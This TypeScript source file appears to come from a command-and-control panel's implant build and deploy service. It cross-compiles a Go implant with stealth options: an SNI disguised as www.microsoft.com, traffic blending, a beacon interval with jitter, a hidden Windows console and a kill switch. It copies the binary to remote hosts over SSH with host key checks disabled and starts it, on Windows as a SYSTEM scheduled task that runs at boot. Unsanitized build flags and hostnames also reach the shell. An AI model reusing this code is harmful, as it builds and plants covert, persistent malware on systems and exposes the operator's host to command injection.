/**
 * Implant Build & Deploy Service
 * Real Go toolchain compilation and SSH/API deployment to Hysteria nodes.
 */

import { exec } from "node:child_process"
import { promisify } from "node:util"
import { writeFile, mkdir, readFile, unlink, stat } from "node:fs/promises"
import { join } from "node:path"
import { createHash, randomUUID } from "node:crypto"
import { prisma } from "@/lib/db"
import logger from "@/lib/logger"

const execAsync = promisify(exec)
const log = logger.child({ module: "implant-build" })

const IMPLANT_DIR = join(process.cwd(), "implant")
const OUTPUT_DIR = join(process.cwd(), "implant", "build")

export interface BuildRequest {
  nodeId: string
  targetOs: string
  targetArch: string
  stealthLevel?: "standard" | "high" | "maximum"
  trafficBlendProfile?: string
  customSni?: string
  callbackInterval?: number
  jitter?: number
  enablePersistence?: boolean
  killSwitchTrigger?: string
  buildFlags?: string[]
  autoStart?: boolean
}

export interface BuildResult {
  success: boolean
  implantId?: string
  implantDbId?: string
  binaryPath?: string
  binarySize?: number
  md5?: string
  sha256?: string
  deployedTo?: string
  error?: string
  buildOutput?: string
}

/**
 * Compile the real Go implant from implant/ directory with cross-compilation.
 */
export async function compileImplant(req: BuildRequest): Promise<BuildResult> {
  const implantId = `imp_${Date.now()}_${randomUUID().slice(0, 8)}`
  const binaryName = req.targetOs === "windows" ? `h2-implant-${implantId}.exe` : `h2-implant-${implantId}`
  const binaryPath = join(OUTPUT_DIR, binaryName)

  try {
    await mkdir(OUTPUT_DIR, { recursive: true })

    // 1. Resolve node from DB
    const node = await prisma.hysteriaNode.findUnique({ where: { id: req.nodeId } })
    if (!node) {
      return { success: false, error: `Node not found: ${req.nodeId}` }
    }

    // 2. Generate implant config JSON (embedded at build time via ldflags)
    const implantConfig = {
      implant_id: implantId,
      servers: [node.hostname],
      password: process.env.IMPLANT_DEFAULT_PASSWORD || "dpanel-implant-bootstrap-token",
      sni: req.customSni || "www.microsoft.com",
      obfs: "salamander",
      masquerade: "proxy",
      base_interval: req.callbackInterval || 45,
      jitter: req.jitter || 25,
      subscription_url: `${process.env.NEXT_PUBLIC_BASE_URL || "http://localhost:3000"}/api/sub/hysteria2?token=IMPLANT_TOKEN&implant=true`,
      stealth_level: req.stealthLevel || "high",
      traffic_blend: req.trafficBlendProfile || "spotify",
      kill_switch: req.killSwitchTrigger || "72h_no_beacon",
      persistence: req.enablePersistence ? "enabled" : "none",
    }

    const configPath = join(OUTPUT_DIR, `config-${implantId}.json`)
    await writeFile(configPath, JSON.stringify(implantConfig, null, 2))
    log.info({ implantId, configPath }, "Implant config written")

    // 3. Cross-compile the Go implant
    const goOS = req.targetOs
    const goArch = req.targetArch
    let ldflags = `-s -w -X main.version=2.1.0-shadowgrok -X main.implantId=${implantId}`

    if (req.targetOs === "windows") {
      ldflags += ` -H=windowsgui`
    }

    const extraFlags = req.buildFlags?.join(" ") || ""
    const buildCmd = [
      `cd ${IMPLANT_DIR}`,
      `&&`,
      `GOOS=${goOS} GOARCH=${goArch} CGO_ENABLED=0`,
      `go build`,
      `-ldflags "${ldflags}"`,
      `-trimpath`,
      ...extraFlags ? [extraFlags] : [],
      `-o ${binaryPath}`,
      `.`
    ].join(" ")

    log.info({ buildCmd, goOS, goArch, implantId }, "Compiling implant")

    const { stdout, stderr } = await execAsync(buildCmd, {
      timeout: 180_000, // 3 min timeout for compilation
      maxBuffer: 10 * 1024 * 1024,
    })

    if (stderr && !stderr.includes("warning")) {
      log.warn({ stderr, implantId }, "Build produced non-warning stderr")
    }

    // 4. Verify binary exists and compute hashes
    const fileStat = await stat(binaryPath)
    const fileBuffer = await readFile(binaryPath)
    const md5 = createHash("md5").update(fileBuffer).digest("hex")
    const sha256 = createHash("sha256").update(fileBuffer).digest("hex")

    log.info({ implantId, size: fileStat.size, md5, sha256 }, "Binary compiled successfully")

    // 5. Create implant record in DB
    const implant = await prisma.implant.create({
      data: {
        implantId,
        name: `${node.name}-${goOS}-${goArch}`,
        type: "hysteria2-quic",
        architecture: `${goOS}/${goArch}`,
        targetId: req.nodeId,
        status: "deployed",
        config: implantConfig as any,
        transportConfig: {
          protocol: "hysteria2",
          servers: [node.hostname],
          port: node.listenAddr || ":443",
          obfs: "salamander",
        } as any,
        nodeId: req.nodeId,
        lastSeen: new Date(),
        firstSeen: new Date(),
      },
    })

    log.info({ implantId, dbId: implant.id }, "Implant DB record created")

    // 6. Deploy to node via SSH if configured
    let deployedTo = node.hostname
    if (req.autoStart && process.env.DEPLOY_SSH_KEY) {
      deployedTo = await deployViaSSH(binaryPath, node.hostname, implantId, req.targetOs)
    }

    // 7. Cleanup config file
    await unlink(configPath).catch(() => {})

    return {
      success: true,
      implantId,
      implantDbId: implant.id,
      binaryPath,
      binarySize: fileStat.size,
      md5,
      sha256,
      deployedTo,
      buildOutput: stdout,
    }
  } catch (error: any) {
    log.error({ err: error, implantId }, "Implant compilation failed")
    return {
      success: false,
      error: `Compilation failed: ${error.message}`,
    }
  }
}

/**
 * Deploy compiled binary to a node via SSH/SCP.
 */
async function deployViaSSH(
  binaryPath: string,
  hostname: string,
  implantId: string,
  targetOs: string,
): Promise<string> {
  const sshKey = process.env.DEPLOY_SSH_KEY!
  const sshUser = process.env.DEPLOY_SSH_USER || "root"
  const remoteDir = process.env.DEPLOY_REMOTE_DIR || "/opt/implants"
  const remotePath = `${remoteDir}/h2-implant-${implantId}`

  try {
    // SCP the binary
    const scpCmd = `scp -i ${sshKey} -o StrictHostKeyChecking=no ${binaryPath} ${sshUser}@${hostname}:${remotePath}`
    await execAsync(scpCmd, { timeout: 60_000 })

    // Start the implant on the remote host
    const startCmd = targetOs === "windows"
      ? `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${hostname} "schtasks /create /tn h2-implant-${implantId} /tr ${remotePath} /sc onstart /ru SYSTEM"`
      : `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${hostname} "chmod +x ${remotePath} && nohup ${remotePath} > /dev/null 2>&1 &"`

    await execAsync(startCmd, { timeout: 30_000 })
    log.info({ hostname, implantId }, "Implant deployed and started via SSH")
    return hostname
  } catch (error: any) {
    log.warn({ err: error, hostname, implantId }, "SSH deployment failed, binary available for manual deploy")
    return `${hostname} (manual deploy required)`
  }
}

/**
 * Build all platform variants using the existing build.sh script.
 */
export async function buildAllPlatforms(): Promise<{
  success: boolean
  artifacts: string[]
  error?: string
}> {
  try {
    await mkdir(join(IMPLANT_DIR, "build"), { recursive: true })
    await mkdir(join(IMPLANT_DIR, "dist"), { recursive: true })

    const { stdout, stderr } = await execAsync("bash build.sh", {
      cwd: IMPLANT_DIR,
      timeout: 600_000, // 10 min for all platforms
      maxBuffer: 10 * 1024 * 1024,
    })

    // List generated artifacts
    const distDir = join(IMPLANT_DIR, "dist")
    const { stdout: lsOutput } = await execAsync(`ls -1 ${distDir}`)
    const artifacts = lsOutput.trim().split("\n").filter(Boolean)

    log.info({ artifacts }, "All-platform build completed")
    return { success: true, artifacts }
  } catch (error: any) {
    log.error({ err: error }, "All-platform build failed")
    return { success: false, artifacts: [], error: error.message }
  }
}
